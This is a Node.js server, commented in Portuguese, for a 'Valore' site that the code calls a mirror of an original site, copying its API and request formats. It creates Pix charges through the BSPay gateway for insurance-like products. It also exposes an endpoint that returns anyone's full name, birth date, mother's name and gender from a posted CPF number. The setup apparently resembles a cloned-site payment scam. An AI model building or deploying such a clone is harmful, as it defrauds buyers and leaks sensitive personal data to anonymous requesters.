'use strict';
/**
 * Valore — servidor do site espelhado (produção).
 *
 * Serve o espelho do site (public/) e implementa a MESMA API que o frontend
 * consome, com os mesmos formatos de requisição e resposta do original:
 *
 *   GET    /api/settings                  -> { activeGatewayId }
 *   PUT    /api/settings                  -> { activeGatewayId }
 *   GET    /api/gateway-fee               -> { fixed, percent }
 *   PUT    /api/gateway-fee               -> { fixed, percent }
 *   GET    /api/products                  -> [ { id, kind, name, gatewayName, price, ... } ]
 *   POST   /api/cpf-lookup   { cpf }      -> { configured, name, birthDate, phone, null, motherName }
 *   POST   /api/visitors                  -> visitante completo
 *   GET    /api/visitors/:id              -> visitante completo
 *   PATCH  /api/visitors/:id              -> visitante completo
 *   POST   /api/orders       { visitorId, productId, bumpIds, pushNotificationId }
 *                                         -> { configured, order: { id, status, amount, totalPrice, qrCodeText, qrCodeBase64 } }
 *   GET    /api/orders/:id                -> { id, status, paidAt }   status: PENDING | COMPLETED
 *   POST   /api/webhooks/bspay            webhook cashin.confirmed / cashin.expired / cashin.refunded
 *   GET    /api/health[?deep=1]           operacional
 *   GET    /api/admin/stats               operacional (protegido por ADMIN_TOKEN em produção)
 *   POST   /api/orders/:id/simulate-paid  SOMENTE fora de produção e com ALLOW_MOCK_PIX=1
 *
 * Zero dependências: Node >= 18.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');

const config = require('./lib/config');
const store = require('./lib/store');
const cpf = require('./lib/cpf');
const cep = require('./lib/cep');
const products = require('./lib/products');
const bspay = require('./lib/bspay');
const pix = require('./lib/pix');
const qrimg = require('./lib/qrimg');

const PUBLIC_DIR = path.join(__dirname, 'public');
const ORDER_LOG = path.join(config.dataDir, 'orders.jsonl');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.txt': 'text/plain; charset=utf-8',
  '.webmanifest': 'application/manifest+json',
  '.map': 'application/json; charset=utf-8',
};

/* --------------------------------- helpers -------------------------------- */

function baseHeaders(req) {
  const h = {
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
  };
  const origin = req?.headers?.origin;
  if (config.corsOrigins.length) {
    /* Lista explícita: libera só os domínios configurados. */
    if (origin && config.corsOrigins.includes(origin)) {
      h['Access-Control-Allow-Origin'] = origin;
      h['Vary'] = 'Origin';
    }
  } else if (!config.isProd && origin) {
    /* Desenvolvimento: qualquer origem, para facilitar testes. */
    h['Access-Control-Allow-Origin'] = origin;
  }
  return h;
}

function sendJson(req, res, status, payload) {
  const body = JSON.stringify(payload);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    ...baseHeaders(req),
  });
  res.end(body);
}

/** A API original responde erro como {"error":"mensagem"}. */
const fail = (req, res, status, message) => sendJson(req, res, status, { error: message });

async function readRaw(req, limit = 512 * 1024) {
  const chunks = [];
  let size = 0;
  for await (const c of req) {
    size += c.length;
    if (size > limit) {
      const e = new Error('Payload muito grande');
      e.status = 413;
      throw e;
    }
    chunks.push(c);
  }
  return Buffer.concat(chunks);
}

async function readJson(req) {
  const raw = await readRaw(req);
  if (!raw.length) return {};
  try {
    return JSON.parse(raw.toString('utf8'));
  } catch {
    const e = new Error('JSON inválido');
    e.status = 400;
    throw e;
  }
}

function clientIp(req) {
  if (config.trustProxy) {
    const fwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
    if (fwd) return fwd;
    const real = req.headers['cf-connecting-ip'];
    if (real) return String(real);
  }
  return (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
}

/* --------------------------- limite de requisições ------------------------- */
const buckets = new Map();

function rateLimited(key, perMinute) {
  if (!perMinute || perMinute <= 0) return false;
  const now = Date.now();
  const b = buckets.get(key) || { count: 0, resetAt: now + 60000 };
  if (now > b.resetAt) { b.count = 0; b.resetAt = now + 60000; }
  b.count++;
  buckets.set(key, b);
  if (buckets.size > 5000) { // faxina simples
    for (const [k, v] of buckets) if (now > v.resetAt) buckets.delete(k);
  }
  return b.count > perMinute;
}

/* ------------------------------- auditoria -------------------------------- */

function logOrder(event, order, extra = {}) {
  /* Eventos de dinheiro são gravados em disco na hora: o store não pode viver
     só em memória por causa do debounce de 150 ms. */
  if (/created|charged|completed|failed|refunded|expired/.test(event)) store.flushNow();
  try {
    fs.mkdirSync(config.dataDir, { recursive: true });
    fs.appendFileSync(ORDER_LOG, `${JSON.stringify({
      at: new Date().toISOString(),
      event,
      orderId: order?.id,
      externalId: order?.externalId,
      transactionId: order?.transactionId || null,
      status: order?.status,
      amount: order?.amount,
      provider: order?.provider,
      visitorId: order?.visitorId,
      ...extra,
    })}\n`);
  } catch (e) {
    console.warn('[audit] falha ao gravar log:', e.message);
  }
}

const publicOrder = (o) => ({
  id: o.id,
  status: o.status,
  amount: o.amount,
  totalPrice: o.totalPrice ?? o.amount,
  qrCodeText: o.qrCodeText || '',
  qrCodeBase64: o.qrCodeBase64 || '',
});

/** Postback derivado do host da requisição quando não há URL configurada. */
function postbackFromRequest(req) {
  if (bspay.pickPostbackUrl()) return null; // já existe uma URL válida no .env
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  if (!host || /^(localhost|127\.0\.0\.1)/i.test(host)) return null;
  const proto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim() || 'https';
  return `${proto}://${host}/api/webhooks/bspay`;
}

/* ----------------------------------- API ---------------------------------- */

async function handleApi(req, res, url) {
  const { pathname, searchParams } = url;
  const method = req.method.toUpperCase();
  const ip = clientIp(req);

  if (method === 'OPTIONS') {
    res.writeHead(204, {
      ...baseHeaders(req),
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Allow-Methods': 'GET,POST,PUT,PATCH,DELETE,OPTIONS',
      'Access-Control-Max-Age': '600',
    });
    return res.end();
  }

  /* ------------------------------- operacional ------------------------------ */
  if (pathname === '/api/health') {
    const deep = searchParams.get('deep') === '1';
    const out = {
      status: 'ok',
      brand: config.brand.name,
      env: config.nodeEnv,
      bspayConfigured: config.bspay.configured,
      cpfApiConfigured: config.cpf.configured,
      mockPix: config.allowMockPix,
      webhookSecured: config.bspay.webhookSecured,
      sandbox: config.bspay.sandbox,
      uptime: Math.round(process.uptime()),
    };
    if (deep && config.bspay.configured) {
      try {
        const t0 = Date.now();
        await bspay.balance();
        out.bspay = { ok: true, latencyMs: Date.now() - t0 };
      } catch (e) {
        out.bspay = { ok: false, code: e.code || null, message: e.message };
        out.status = 'degraded';
      }
    }
    return sendJson(req, res, 200, out);
  }

  if (pathname === '/api/admin/stats') {
    const token = process.env.ADMIN_TOKEN;
    if (config.isProd) {
      if (!token) return fail(req, res, 404, 'Rota não encontrada');
      if ((req.headers.authorization || '') !== `Bearer ${token}`) {
        return fail(req, res, 401, 'Não autorizado');
      }
    }
    return sendJson(req, res, 200, {
      ...store.stats(),
      bspay: { configured: config.bspay.configured, base: config.bspay.apiBase, sandbox: config.bspay.sandbox },
      pix: { provider: config.bspay.configured ? 'bspay' : 'mock' },
    });
  }

  /* --------------------------------- settings ------------------------------- */
  if (pathname === '/api/settings') {
    if (method === 'GET') return sendJson(req, res, 200, store.getSettings());
    if (method === 'PUT' || method === 'POST') {
      if (config.isProd) return fail(req, res, 403, 'Alteração desabilitada em produção');
      const body = await readJson(req);
      return sendJson(req, res, 200, store.setSettings({ activeGatewayId: String(body.activeGatewayId || config.bspay.activeGatewayId) }));
    }
  }

  /* ------------------------------- taxa gateway ----------------------------- */
  if (pathname === '/api/gateway-fee') {
    if (method === 'GET') return sendJson(req, res, 200, store.getGatewayFee());
    if (method === 'PUT' || method === 'POST') {
      if (config.isProd) return fail(req, res, 403, 'Alteração desabilitada em produção');
      const body = await readJson(req);
      return sendJson(req, res, 200, store.setGatewayFee(body));
    }
  }

  /* --------------------------------- produtos ------------------------------- */
  if (pathname === '/api/products' && method === 'GET') {
    return sendJson(req, res, 200, products.all());
  }

  /* ------------------------------ consulta de CPF --------------------------- */
  if (pathname === '/api/cpf-lookup' && method === 'POST') {
    if (rateLimited(`cpf:${ip}`, config.rateLimit.cpfPerMin)) {
      return fail(req, res, 429, 'Muitas consultas. Aguarde um instante.');
    }
    const body = await readJson(req);
    try {
      const person = await cpf.lookup(body.cpf);
      const genderMap = { M: 'masculino', F: 'feminino' };
      return sendJson(req, res, 200, {
        configured: config.cpf.configured,
        name: person.nome,
        birthDate: person.nascimento,
        /* O campo "Celular (WhatsApp)" usa este valor: sempre null para o
           cliente digitar o próprio número em vez de vir da consulta. */
        phone: null,
        motherName: person.nomeMae,
        gender: genderMap[person.genero] || '',
      });
    } catch (e) {
      return fail(req, res, e.status || 502, e.message);
    }
  }

  /* -------------------------------- visitantes ------------------------------ */
  if (pathname === '/api/visitors' && method === 'POST') {
    const body = await readJson(req);
    const utm = Object.fromEntries([...searchParams].filter(([k]) => k.startsWith('utm_')));
    return sendJson(req, res, 200, store.createVisitor(body, {
      ip,
      userAgent: req.headers['user-agent'] || '',
      utm,
    }));
  }

  const visitorMatch = pathname.match(/^\/api\/visitors\/([\w-]{4,64})$/);
  if (visitorMatch) {
    const id = visitorMatch[1];
    if (method === 'GET') {
      const v = store.getVisitor(id);
      if (!v) return fail(req, res, 404, 'Visitante não encontrado');
      return sendJson(req, res, 200, v);
    }
    if (method === 'PATCH' || method === 'PUT') {
      const body = await readJson(req);
      if (!store.getVisitor(id)) return fail(req, res, 404, 'Visitante não encontrado');
      return sendJson(req, res, 200, store.updateVisitor(id, body));
    }
  }

  /* ------------------------------ criação de PIX ---------------------------- */
  if (pathname === '/api/orders' && method === 'POST') {
    if (rateLimited(`orders:${ip}`, config.rateLimit.ordersPerMin)) {
      return fail(req, res, 429, 'Muitas solicitações. Aguarde um instante.');
    }

    const body = await readJson(req);
    const visitorId = body.visitorId || null;
    const items = products.resolveItems(body.productId || 'seguro-plus', body.bumpIds || []);
    if (!items.length) return fail(req, res, 400, 'Dados inválidos');

    const amount = products.totalOf(items);
    const visitor = visitorId ? store.getVisitor(visitorId) : null;

    const order = store.createOrder({
      visitorId,
      items,
      amount,
      totalPrice: amount,
      externalId: makeExternalId(),
      provider: 'pending',
      pushNotificationId: body.pushNotificationId || null,
      customer: {
        name: visitor?.name || '',
        document: (visitor?.cpf || '').replace(/\D/g, ''),
        email: visitor?.email || '',
      },
      ip,
    });
    logOrder('created', order);

    let charge;
    try {
      charge = await bspay.createPixCharge({
        amount,
        externalId: order.externalId,
        description: items.map((i) => i.name).join(' + '),
        postbackUrl: postbackFromRequest(req),
        payer: {
          name: order.customer.name,
          document: order.customer.document,
          email: order.customer.email,
        },
      });
    } catch (e) {
      if (!config.allowMockPix) {
        store.updateOrder(order.id, { status: 'FAILED', gatewayError: { code: e.code, message: e.message } });
        logOrder('failed', store.getOrder(order.id), { code: e.code, message: e.message });
        console.error(`[pix] falha ao criar cobrança na BSPay (${e.code}): ${e.message}`);
        return fail(req, res, e.status || 502, 'Não foi possível gerar o PIX agora. Tente novamente.');
      }

      /* Modo local (nunca em produção sem ALLOW_MOCK_PIX=1). */
      const code = pix.buildPixPayload({
        key: config.pix.key,
        amount,
        merchant: config.brand.name,
        city: 'SAO PAULO',
        txid: order.id.replace(/\W/g, '').toUpperCase(),
        description: items[0]?.name,
      });
      console.warn(`[pix] BSPay indisponível (${e.code || e.message}); ordem ${order.id} gerada em modo local`);
      store.updateOrder(order.id, {
        provider: 'mock',
        status: 'PENDING',
        qrCodeText: code,
        qrCodeBase64: qrimg.toBase64(code),
        gatewayError: { code: e.code || 'BSPAY_ERROR', message: e.message },
      });
      logOrder('created-mock', store.getOrder(order.id));
      return sendJson(req, res, 200, { configured: true, order: publicOrder(store.getOrder(order.id)) });
    }

    store.updateOrder(order.id, {
      provider: 'bspay',
      status: 'PENDING',
      qrCodeText: charge.qrcode,
      qrCodeBase64: charge.qrcode ? qrimg.toBase64(charge.qrcode) : '',
      transactionId: charge.transactionId,
      fee: charge.fee,
      expiresAt: charge.expiresAt || null,
      postbackUrl: charge.postbackUrl || null,
    });
    logOrder('charged', store.getOrder(order.id));
    return sendJson(req, res, 200, { configured: true, order: publicOrder(store.getOrder(order.id)) });
  }

  /* ------------------------------ status da ordem --------------------------- */
  const orderMatch = pathname.match(/^\/api\/orders\/([\w-]{4,64})$/);
  if (orderMatch && method === 'GET') {
    const order = store.getOrder(orderMatch[1]);
    if (!order) return fail(req, res, 404, 'Ordem não encontrada');

    store.expireStale();
    let fresh = store.getOrder(order.id);

    /* Reconciliação: pendente + BSPay configurada + ordem com mais de 15s. */
    const ageMs = Date.now() - new Date(fresh.createdAt).getTime();
    if (
      fresh.status === 'PENDING'
      && fresh.provider === 'bspay'
      && config.bspay.configured
      && ageMs > 15000
      && Date.now() - (fresh.lastReconcileAt || 0) > 10000
    ) {
      store.updateOrder(fresh.id, { lastReconcileAt: Date.now() });
      try {
        const check = await bspay.isChargePaid({ externalId: fresh.externalId, transactionId: fresh.transactionId });
        if (check.paid) {
          store.completeOrder(fresh.id, 'reconcile', { status: check.status });
          logOrder('completed', store.getOrder(fresh.id), { source: 'reconcile' });
        }
      } catch (e) {
        console.warn('[reconcile] falha:', e.message);
      }
      fresh = store.getOrder(order.id);
    }

    return sendJson(req, res, 200, { id: fresh.id, status: fresh.status, paidAt: fresh.paidAt });
  }

  /* ------------------------- simulação de pagamento (dev) -------------------- */
  const paidMatch = pathname.match(/^\/api\/orders\/([\w-]{4,64})\/simulate-paid$/);
  if (paidMatch && method === 'POST') {
    if (config.isProd || !config.allowMockPix) {
      return fail(req, res, 403, 'Simulação desabilitada');
    }
    if (!store.getOrder(paidMatch[1])) return fail(req, res, 404, 'Ordem não encontrada');
    const o = store.completeOrder(paidMatch[1], 'mock', { at: new Date().toISOString() });
    logOrder('completed', o, { source: 'mock' });
    return sendJson(req, res, 200, { id: o.id, status: o.status, paidAt: o.paidAt });
  }

  /* ---------------------------------- webhook ------------------------------- */
  if (pathname === '/api/webhooks/bspay' && method === 'POST') {
    const raw = await readRaw(req);
    const event = String(req.headers['x-webhook-event'] || '');
    const signature = req.headers['x-webhook-signature'];
    const sandbox = req.headers['x-sandbox'] === '1';
    const ts = req.headers['x-webhook-timestamp'];

    let payload = {};
    try { payload = JSON.parse(raw.toString('utf8')); } catch { /* corpo não-JSON */ }

    const data = payload.data || {};
    const txId = payload.transaction_id || data.transaction_id;
    const externalId = data.external_id || payload.external_id;
    const order = (externalId && store.findByExternalId(externalId)) || store.findByTransactionId(txId);

    /* Verificação: assinatura HMAC quando existe segredo; caso contrário,
       o webhook é tratado apenas como aviso e a confirmação é buscada na API. */
    let verified = false;
    if (config.bspay.webhookSecured) {
      if (!bspay.webhookTimestampOk(ts)) {
        console.warn('[webhook] timestamp fora da janela anti-replay:', ts);
        return fail(req, res, 401, 'Assinatura inválida');
      }
      verified = bspay.verifyWebhook(raw, signature);
      if (!verified) {
        console.warn('[webhook] assinatura inválida — evento:', event);
        return fail(req, res, 401, 'Assinatura inválida');
      }
    }

    if (!order) {
      /* Pode ser um webhook de outro sistema/ordem antiga: responde 200 para
         o gateway não ficar reentregando indefinidamente. */
      return sendJson(req, res, 200, { received: true, matched: false, verified });
    }

    if (sandbox) {
      return sendJson(req, res, 200, { received: true, matched: true, sandbox: true, orderId: order.id });
    }

    const confirmed = verified || (config.bspay.webhookSecured ? false : await confirmOnGateway(order, txId));

    if (event === 'cashin.confirmed' && confirmed) {
      store.completeOrder(order.id, verified ? 'webhook' : 'webhook+gateway', payload);
      logOrder('completed', store.getOrder(order.id), { source: verified ? 'webhook' : 'webhook+gateway' });
    } else if (event === 'cashin.expired') {
      store.updateOrder(order.id, { status: 'EXPIRED' });
    } else if (event === 'cashin.refunded') {
      store.updateOrder(order.id, { status: 'REFUNDED' });
    } else if (event === 'cashin.confirmed') {
      console.warn(`[webhook] confirmação não validada para a ordem ${order.id} — mantida pendente`);
      return sendJson(req, res, 200, { received: true, matched: true, confirmed: false, orderId: order.id });
    }

    return sendJson(req, res, 200, {
      received: true,
      matched: true,
      verified,
      orderId: order.id,
      status: store.getOrder(order.id).status,
    });
  }

  /* ----------------------------------- CEP ---------------------------------- */
  const cepMatch = pathname.match(/^\/api\/cep\/(\d{5}-?\d{3})$/);
  if (cepMatch) {
    try {
      return sendJson(req, res, 200, await cep.lookup(cepMatch[1]));
    } catch (e) {
      return fail(req, res, e.status || 502, e.message);
    }
  }

  return fail(req, res, 404, `Rota não encontrada: ${method} ${pathname}`);
}

/** Confirma a ordem consultando o gateway (usado quando não há webhook_secret). */
async function confirmOnGateway(order, txId) {
  if (!config.bspay.configured) return false;
  try {
    const check = await bspay.isChargePaid({
      externalId: order.externalId,
      transactionId: order.transactionId || txId,
    });
    return !!check.paid;
  } catch (e) {
    console.warn('[webhook] não foi possível confirmar na BSPay:', e.message);
    return false;
  }
}

const ALPHABET = 'abcdefghijklmnopqrstuvwxyz0123456789';
function makeExternalId() {
  let r = '';
  for (let i = 0; i < 8; i++) r += ALPHABET[Math.floor(Math.random() * ALPHABET.length)];
  return `valore-${Date.now().toString(36)}${r}`;
}

/* ------------------------------ arquivos estáticos ------------------------- */

function serveStatic(req, res, url) {
  let rel = decodeURIComponent(url.pathname);
  if (rel.endsWith('/')) rel += 'index.html';

  const file = path.join(PUBLIC_DIR, path.normalize(rel).replace(/^([/\\])+/, ''));
  if (!file.startsWith(PUBLIC_DIR)) return sendText(res, 403, 'Acesso negado', req);

  const exists = fs.existsSync(file) && fs.statSync(file).isFile();
  if (!exists) {
    /* SPA: rota sem extensão cai no index (roteador client-side). */
    if (path.extname(rel)) return sendText(res, 404, 'Arquivo não encontrado', req);
    return serveFile(res, path.join(PUBLIC_DIR, 'index.html'), req);
  }
  return serveFile(res, file, req);
}

function serveFile(res, file, req) {
  const ext = path.extname(file).toLowerCase();
  const isHtml = ext === '.html';
  /* Assets têm hash no nome -> cache longo. HTML sempre revalidado. */
  const immutable = /-[A-Za-z0-9_]{8,}\.(js|css)$/.test(path.basename(file));
  try {
    const data = fs.readFileSync(file);
    res.writeHead(200, {
      'Content-Type': MIME[ext] || 'application/octet-stream',
      'Cache-Control': isHtml ? 'no-store' : (immutable ? 'public, max-age=31536000, immutable' : 'public, max-age=3600'),
      'Content-Length': data.length,
      ...baseHeaders(req),
    });
    res.end(data);
  } catch {
    sendText(res, 500, 'Falha ao ler arquivo', req);
  }
}

function sendText(res, status, text, req) {
  res.writeHead(status, { 'Content-Type': 'text/plain; charset=utf-8', ...baseHeaders(req) });
  res.end(text);
}

/* ----------------------------------- server -------------------------------- */

async function handler(req, res) {
  const started = Date.now();
  const proto = req.headers['x-forwarded-proto'] || 'http';
  const host = req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1';
  const url = new URL(req.url, `${proto}://${host}`);
  try {
    if (url.pathname.startsWith('/api/')) {
      await handleApi(req, res, url);
    } else {
      serveStatic(req, res, url);
    }
  } catch (err) {
    console.error('[erro]', err.message);
    if (!res.headersSent) fail(req, res, err.status || 500, err.message || 'Erro interno');
    else res.end();
  }
  if (process.env.ACCESS_LOG === '1') {
    console.log(`${new Date().toISOString()} ${req.method} ${url.pathname} ${res.statusCode} ${Date.now() - started}ms`);
  }
}

const server = http.createServer(handler);

/** Avisos de configuração que importam em produção. */
function preflight() {
  const warns = [];
  const errors = [];

  if (config.isProd) {
    if (config.allowMockPix) warns.push('ALLOW_MOCK_PIX está ativo em produção: PIX pode ser gerado em modo local se a BSPay falhar. Use ALLOW_MOCK_PIX=0.');
    if (!config.bspay.configured) errors.push('BSPAY_CLIENT_ID/BSPAY_CLIENT_SECRET não configurados — nenhum PIX será criado na BSPay.');
    if (config.bspay.postbackUrl && /SEU_DOMINIO/i.test(config.bspay.postbackUrl) && !config.publicBaseUrl) {
      warns.push('BSPAY_POSTBACK_URL ainda é o exemplo — o webhook usará o padrão da credencial.');
    }
    if (!config.bspay.webhookSecured) warns.push('BSPAY_WEBHOOK_SECRET ausente: webhooks serão confirmados por consulta à API (mais lento, porém seguro).');
  }

  for (const w of warns) console.warn(`  [aviso] ${w}`);
  for (const e of errors) console.error(`  [erro ] ${e}`);
  return errors.length === 0;
}

if (require.main === module) {
  const ready = preflight();
  server.listen(config.port, config.host, () => {
    const shown = config.publicBaseUrl || `http://127.0.0.1:${config.port}`;
    console.log(`\n  ${config.brand.name} — site espelhado no ar (${config.nodeEnv})`);
    console.log(`  site        ${shown}`);
    console.log(`  API         ${shown}/api/health`);
    console.log(`  escutando   ${config.host}:${config.port}`);
    console.log(`  BSPay       ${config.bspay.configured ? `configurada (${config.bspay.apiBase})` : 'NÃO configurada'}`);
    console.log(`  webhook     ${config.bspay.webhookSecured ? 'assinatura HMAC validada' : 'sem segredo: confirmação via API'}`);
    console.log(`  PIX local   ${config.allowMockPix ? 'permitido' : 'desabilitado'}`);
    console.log(`  API de CPF  ${config.cpf.configured ? 'configurada' : 'token placeholder'}`);
    console.log(`  dados       ${config.dataDir}\n`);
    if (!ready) console.warn('  [atenção] corrija os erros acima antes de receber tráfego.\n');
  });

  const shutdown = (sig) => {
    console.log(`\n${sig} recebido, encerrando...`);
    server.close(() => { store.flushNow(); process.exit(0); });
    setTimeout(() => { store.flushNow(); process.exit(0); }, 5000).unref();
  };
  process.on('SIGINT', () => shutdown('SIGINT'));
  process.on('SIGTERM', () => shutdown('SIGTERM'));
  process.on('unhandledRejection', (e) => console.error('[unhandledRejection]', e));
  process.on('uncaughtException', (e) => { console.error('[uncaughtException]', e); store.flushNow(); });
}

handler.server = server;
handler.handleApi = handleApi;

module.exports = handler;
